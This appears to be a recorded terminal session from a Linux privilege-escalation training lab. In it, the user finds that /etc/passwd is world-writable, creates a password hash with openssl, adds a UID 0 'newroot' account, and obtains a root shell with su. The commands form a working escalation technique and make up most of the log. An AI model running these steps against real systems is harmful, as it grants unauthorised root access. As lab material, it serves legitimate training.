@@ -1,0 +1,81 @@
+Script started on 2025-03-22 11:17:29+03:00 [COMMAND="ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@linux.privesc.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+user@linux.privesc.thm's password: 
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Mar 22 04:10:19 2025 from ip-10-8-61-245.eu-west-1.compute.internal
+]0;user@debian: ~user@debian:~$ ls -l /etc/passwd
+-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
+]0;user@debian: ~user@debian:~$ openssl passwd newpasswordhere[K[K[K[K[1Ppassword[1Ppassword[1Ppassword
+rLMMqgKYtSI9I
+]0;user@debian: ~user@debian:~$ cat /etc:[K/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+statd:x:103:65534::/var/lib/nfs:/bin/false
+mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
+]0;user@debian: ~user@debian:~$ echo "root:x:0:0:root:/root:/bin/bashnroot:x:0:0:root:/root:/bin/basheroot:x:0:0:root:/root:/bin/bashwroot:x:0:0:root:/root:/bin/bash[C[C[C[C[C[C[1P:0:0:root:/root:/bin/bashr:0:0:root:/root:/bin/bashL:0:0:root:/root:/bin/bashM:0:0:root:/root:/bin/bashM:0:0:root:/root:/bin/bashq:0:0:root:/root:/bin/bashg:0:0:root:/root:/bin/bashK:0:0:root:/root:/bin/bashY:0:0:root:/root:/bin/basht:0:0:root:/root:/bin/bashS:0:0:root:/root:/bin/bashI:0:0:root:/root:/bin/bash9:0:0:root:/root:/bin/bashI:0:0:root:/root:/bin/bash[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C" > /etc/[K[K[K[K[K[K> /etc/passwd
+]0;user@debian: ~user@debian:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+statd:x:103:65534::/var/lib/nfs:/bin/false
+mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
+newroot:rLMMqgKYtSI9I:0:0:root:/root:/bin/bash
+]0;user@debian: ~user@debian:~$ su newroot
+Password: 
+su: Authentication failure
+]0;user@debian: ~user@debian:~$ su newroot
+Password: 
+root@debian:/home/user# id
+uid=0(root) gid=0(root) groups=0(root)
+root@debian:/home/user# exit
+exit
+]0;user@debian: ~user@debian:~$ exit
+logout
+Connection to linux.privesc.thm closed.
+
+Script done on 2025-03-22 11:24:07+03:00 [COMMAND_EXIT_CODE="0"]
